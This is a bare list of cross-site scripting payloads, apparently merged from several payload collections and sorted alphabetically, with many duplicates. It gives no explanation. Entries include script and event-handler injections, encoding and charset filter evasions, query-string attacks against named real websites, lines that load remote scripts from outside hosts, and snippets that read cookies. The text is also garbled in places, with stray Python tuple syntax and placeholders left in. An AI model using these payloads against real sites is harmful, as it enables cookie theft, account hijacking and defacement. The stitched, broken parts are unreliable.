evil=/ev/.source+/al/.source,changeProto=/Strin/.source+/g.prototyp/.source+/e.ss=/.source+/Strin/.source+/g.prototyp/.source+/e.substrin/.source+/g/.source,hshCod=/documen/.source+/t.locatio/.source+/n.has/.source+/h/.source;7[evil](changeProto);hsh=7[evil](hshCod),cod=hsh.ss(1);7 evil](cod)
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://vulnerability-lab.com/CrossSiteScripting.js></SCRIPT>'"-->
<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
>"exp/*<A STYLE='no\CrossSiteScripting:noCrossSiteScripting("*//*");CrossSiteScripting:ex/*CrossSiteScripting*//*/*/pression(document.cookie=true)'>
exp/*<A STYLE='no\CrossSiteScripting:noCrossSiteScripting("*//*");CrossSiteScripting:ex/*CrossSiteScripting*//*/*/pression(document.cookie=true)'>
exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
exp/*&lt;A STYLE='no\xss&#58;noxss(\"*//*\");
exp/*<XSS STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
&f%3AsearchInputString=%27%22%3E%3Cscript++type%3D%22text%2Fjavascript%22%3Ealert%28%22hi%2C+reddit%22%29%3Bdocument.write%28%27%3Cimg+src%3D%22http%3A%2F%2Fthumbs.reddit.com%2Ft5_2qxe8.png%3Fv%3D60c0bc6ee97246414e7b0738fb0040ef%22%2F%3E%27%29%3C%2Fscript%3E%3Cdiv+id%3D%22&f%3Asearch=+&formID=globalSearchForm
&facilityName=%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E
&fh_Params=query_origin%3Dhost_frs-app02.frs.local_code_FasGetAll%26method%3DgetAll%26omitxmldecl%3Dyes%26fh_location%3D%252f%252ffrs%252fnl_NL%252fsite%253e%257bfreerecordshop%257d%252fcategories%253c%257bfrs_02%257d%252fcategories%253c%257bfrs_02_films1%257d%252fproducttype%253d81%252fnewrelease%253d0%26fh_eds%3D%25c3%259f%26fh_sort_by%3Dpopularity_frs_nl&SubCat=02%22-alert%28%22XSS%22%29-%22
&file=%22%3E%3Cimg%20src=//bit.ly/2avPU%3E%3C!--
&filename=index.html&filepath=Honesty.%3CScRiPt%20%0A%0D%3Ealert%28String.fromCharCode%2885,108,116,105,109,97,32,85,110,100,101,114,119,111,114,108,100,32,104,97,115,32,109,111,114,101,32,34,65,118,97,116,97,114,105,99,32,82,101,118,101,108,97,116,105,111,110,34,32,116,104,97,110,32,116,104,105,115,32,99,104,97,114,97,99,116,101,114,44,32,110,111,32,111,102,102,101,110,115,101,46%29%29%3B%3C/ScRiPt%3Ewithin.this.organization.DOC...
&filter=%22%20onclick='alert(%22XSS%22)'%20%22&order=ryear&limit=25&option=com_jombib&catid=$catId
&finalDestination="><script>alert('You have been hacked!')</script>
&find=%27%3Balert%28%2FXSSPOSED%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F%26q%3D%27%3Balert%280%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F
firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
Firefox (\x09, \x0a, \x0d, \x20)
&firstname=%22%3E%3Cscript%3Edocument.body.innerHTML%20%3D% 20%22%3Cblink%20style%3D'color%3A%20red%3B%20font-size%3A%2080px%3B'%3ELocked%20my%20ass!%3C% 2Fblink%3E%22%3B%3C/script%3E%3Cx
&firstsearch=1&key=title&match=loose&value=%22%3E%3CSCRIPT%20SRC=http://ha.ckers.org/xss.js%3E%3C/SCRIPT%3E
&flash=true&page=%27;alert(/XSSPOSED)//\\%27;alert(1)//%22;alert(2)//\\%22;alert(3)//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(/XSSPOSED/)%3C/SCRIPT%3E=&{}%22);}alert(6);function+xss(){//&q=%27;alert(0)//\\%27;alert(1)//%22;alert(2)//\\%22;alert(3)//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(/XSSPOSED/)%3C/SCRIPT%3E=&{}%22);}alert(6);function+xss(){//
&fname=%3Cscript%3Ealert%28%27XSSPOSED%27%29%3C/script%3E
&focus=site&query=--%253E%253Cbody%2520onload=alert%28%2522XSS%2522%29%253E%253C!--
&focus=site&query=%3Cscript%3Ealert%28%22O%22%29%3C%2Fscript%3E&search=+
<font style='color:expression(alert(document.cookie))'>
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
foo%00<script>alert(document.cookie)</script>
foo\í; alert(document.cookie);//í;
<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
<! foo="><script>alert(1)</script>">
<! foo="><script>alert(1)</script>">
<? foo="><script>alert(1)</script>">
<? foo="><script>alert(1)</script>">
</ foo="><script>alert(1)</script>">
</ foo="><script>alert(1)</script>">
&foo=<SCrIPT>alert("I BEESEECH THEE, PHOTOETH MINE VISAGE")</SCrIPT>
&foo=<SCrIPT>alert("PLEASE PHOTO MY FACE")</SCrIPT>
<! foo="><script>javascript:alert(1)</script>">
<! foo="><script>javascript:alert(1)</script>">
<? foo="><script>javascript:alert(1)</script>">
<? foo="><script>javascript:alert(1)</script>">
</ foo="><script>javascript:alert(1)</script>">
</ foo="><script>javascript:alert(1)</script>">
<% foo><x foo="%><script>alert(123)</script>">
<? foo="><x foo='?><script>alert(1)</script>'>">
<? foo="><x foo='?><script>javascript:alert(1)</script>'>">
<? foo="><x foo='?><script>javascript:alert(1)</script>'>">
<% foo><x foo="%><script>javascript:alert(1)</script>">
<% foo><x foo="%><script>javascript:alert(1)</script>">
<form/action='data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt'><button>CLICK // Mario
<form action="Javascript:alert(1)"><input type=submit> // Firefox, IE
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
<form><button formaction="javascript:alert(123)">crosssitespt
<form><button formaction="javascript:alert(XSS)">lol
<form><button formaction=javascript&colon;alert(1)>CLICKME
<form><button formaction=javascript&colon;alert(1)>CLICKME
<form><button formaction=javascript&colon;alert(1)>CLICKME
<form><button formaction=javascript&colon;alert(1)>CLICKME
<form><button formaction=javascript&colon;alert(1)>CLICKME
<form><button formaction=javascript&colon;alert(1)>CLICKME
<form><button formaction="javascript:javascript:alert(1)">X
<form><button formaction="javascript:javascript:alert(1)">X
<form id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION
<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<form><input type="image" value="submit" formaction=//goo.gl/nlX0P>
<form><isindex formaction="javascript&colon;confirm(1)"
<form><isindex formaction="javascript&colon;confirm(1)"
<form><isindex formaction="javascript&colon;confirm(1)"
<form><isindex formaction="javascript&colon;confirm(1)"
<form><isindex formaction="java&Tab;s&NewLine&cript&colon;confirm(1)">
<form oninput=alert(1)></input></form>
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<FRAMESET><FRAME SRC="javascript:document.cookie=true;"></FRAMESET>
>"<FRAMESET><FRAME SRC="javascript:document.cookie=true;"></FRAMESET>
<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>
<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>
<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
<frameset onload=alert(123)>
<frameset onload=javascript:alert(1)>
<frameset onload=javascript:alert(1)>
<frameset onload=javascript:javascript:alert(1)></frameset>
<frameset onload=javascript:javascript:alert(1)></frameset>
<frameset/onpageshow=alert(1)>
<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
&from=pooptato&to=<font%20color=00ff00><marquee%20BEHAVIOR=ALTERNATE%20BGColor=black><plaintext>
&fruitid=%22/%3E%3Cscript%3Ealert%281%29;%3C/script%3E
&fulltext=Search&search=%3Cimg%20src=x%20onerror=prompt%28/XSSPOSED/%29%3E
&func=detail&group_id=73833&atid=539099&aid="><script>alert(String.fromCharCode(88,83,83))</script>
&fuseAction=projects.view&&project_id="><script>alert(String.fromCharCode(88,83,83))</script>
&FuseAction=Search.Results&Keywords="><script>alert(String.fromCharCode(88,83,83))</script>
&&fuseaction=tools.message&message=%22%3E%3Cvar%20onmouseover=%22prompt%28/XSSPOSED/%29%22%3EOn%20Mouse%20Over%3C/var%3E&title=Activity
Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>
&Gemeente=Almere%22%20onclick='alert(%22XSS%22);'%20%22
&Genre=Tech%20Note&PKey="><script>alert('XSS')</script>
&gws_rd=ssl#q=inurl:ReferralType%3DW
&h=195&q=90&src=%27%22%28%29%26%251%3CScRiPt%20%3Eprompt%281234567890%29%3C%2fScRiPt%3E&w=540&zc=1
<h1><font color=blue>hellox worldss</h1>
&h=4&z=350&al='><script>alert(1234)</script>&st=y
&hdrFo=mthdr02%27"--><svg><script><!>alert('XSS');document.location.replace('http://xssed.com')</script>
<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>
<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('CrossSiteScripting');+ADw-/SCRIPT+AD4-
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.cookie=true;+ADw-/SCRIPT+AD4-
>"<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.cookie=true;+ADw-/SCRIPT+AD4-
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
&height=360&imagePath=/content/us/en/food/food_quality/see_what_we_are_made_of/inside_our_kitchens/jcr:content/genericpagecontent/video_1/stillimage.img.jpg/1270296485736.jpg%22%3E%3Cmarquee/onstart=confirm%28/XSSPOSED/%29%3E&link=/content/us/en/food/food_quality/see_what_we_are_made_of/inside_our_kitchens.html&path=sss
<html><body>
<HTML><BODY>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="CrossSiteScripting<SCRIPT DEFER>document.cookie=true</SCRIPT>"></BODY></HTML>
>"<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="CrossSiteScripting<SCRIPT DEFER>document.cookie=true</SCRIPT>"></BODY></HTML>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
<html><noalert><noscript>(123)</noscript><script>(123)</script>
<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>
<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>
<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
<HTML xmlns:CrossSiteScripting><?import namespace="CrossSiteScripting" implementation="http://ha.ckers.org/CrossSiteScripting.htc"><CrossSiteScripting:CrossSiteScripting>CrossSiteScripting</CrossSiteScripting:CrossSiteScripting>
<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
http://aa<script>alert(123)</script>
http://aa'><script>alert(123)</script>
http://aa"><script>alert(123)</script>
HTTP Parameter Pollution
http://target.com/something.jsp?inject=<script>eval(location.hash.slice(1))</script>#alert(1)
http://target.com/something.xxx?a=val1&a=val2
http://www.google<script .com>alert(document.location)</script
http://www.google<script .com>alert(document.location)</script
http://www.google<script .com>alert(document.location)</script
http://www.google<script .com>alert(document.location)</script
http://www.<script>alert(1)</script .com
http://www.<script>alert(1)</script .com
http://www.<script>alert(1)</script .com
http://www.<script>alert(1)</script .com
http://www.<script>alert(1)</script .com
http://www.<script>alert(1)</script .com
i
&i=%3C%2Ftitle%3E%3Cmarquee%3E%3Cimg+src%3D%22http%3A%2F%2Fstatic.reddit.com%2Freddit.com.header.png%22%2F%3E%3C/marquee%3E%3Ctitle%3E
&iama=' onmouseover='alert("XSS")' style="position:absolute;top:0;left:0;width:100%;height:100%;background:url('http://is.gd/rc7syX')" name='
&ics_src=%22%3E%3Cimg%20src=%22http://tinyurl.com/yjmg7z9%22%20onload=%22alert%28document.cookie%29%22%3E
&id=0205"><script>alert(String.fromCharCode(88,83,83))</script>
&id=101;alert('xss')
&id=11
&id=1&cat=<script>alert('pleasephotomyface')</script>
&id=%22/%3E%3CEMBED%20SRC=%22//reddit.com/r/xss%22%20width='500'%20height='500'''%3E%3C/EMBED%3E
&id=%22/%3E%3Cscript%20src=https://xssposed.org/1.js
&id=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
&ID=239&AT=%3Cscript%3Ealert('port22%20-%20:D');%3C/script%3E
&id=244090"><script>alert(String.fromCharCode(88,83,83))</script>
&id=%27;alert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29//\\%27;alert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29//%22;alert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29//\\%22;alert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29%3C/SCRIPT%3E
&id=2869&action=register&redirectfullurl=%22%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E%3Ca
&id=3944&qt=%22%29;%20alert%28%22XSS
&id=396&rub=11"><script>alert(document.cookie)</script>
&id=403/403478&key=2&query=%3C/script%3E%22%3E%3Cscript%3Ealert%280%29%3C/script%3E
&Id=408"><script>alert(String.fromCharCode(88,83,83))</script>
&id=9437&tref=A%22%29;%20alert%28%22XSS%22%29;%20//
&id_menu=%22%3E%3Csvg/onload=alert%28/xssposed/%29%20%3E
&ie=utf8&site=CBC&output=xml_no_dtd&getfields=description&oe=utf8&safe=high&q=%27;alert%280%29//\\%27;
<!--[if gte IE 4]>   <SCRIPT>alert('CrossSiteScripting');</SCRIPT>   <![endif]-->
<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
<!--[if<img src=x onerror=javascript:alert(1)//]> -->
<!--[if<img src=x onerror=javascript:alert(1)//]> -->
<iframe/%00/ src=javaSCRIPT&colon;alert(1)
<iframe/%00/ src=javaSCRIPT&colon;alert(1)
<iframe/%00/ src=javaSCRIPT&colon;alert(1)
<iframe/%00/ src=javaSCRIPT&colon;alert(1)
<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
<iframe%0Aname="javascript:\u0061\u006C\u0065\u0072\u0074(1)" %0Aonload="eval(name)";>
"><iframe%20src="http://google.com"%%203E
<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() { return document.cookie }}); alert(Safe.get());</script>
<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>
<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>
<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
<iframe/onreadystatechange=alert(1)
<iframe/onreadystatechange=alert(1)
<iframe/onreadystatechange=alert(1)
<iframe/onreadystatechange=alert(1)
<iframe/onreadystatechange=alert(1)
<iframe/onreadystatechange=alert(1)
<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>
"></iframe><script>alert(123)</script>
<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe  src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe> (Firefox, Chrome, Safari)
<iframe src="data:text/html,<script>alert(0)</script>"></iframe> (Firefox, Chrome, Safari)
<iframe/src="data:text/html,<svg%09%0A%0B%0C%0D%A0%00%20onload =confirm(1);>";>
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">
<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">
<iframe src=http://ha.ckers.org/scriptlet.html <
<iframe src=http://ha.ckers.org/scriptlet.html <
<iframe src=http://ha.ckers.org/scriptlet.html <
<IFRAME SRC=http://ha.ckers.org/scriptlet.html <
<iframe src="http://target.com/something.jsp?inject=<script>eval(name)</script>" name="alert(1)"></iframe>
<iframe src=http://vulnerability-lab.com>1337+1
<iframe src=http://vulnerability-lab.com/>@gmail.com
>"<iframe src=http://vulnerability-lab.com/>@gmail.com
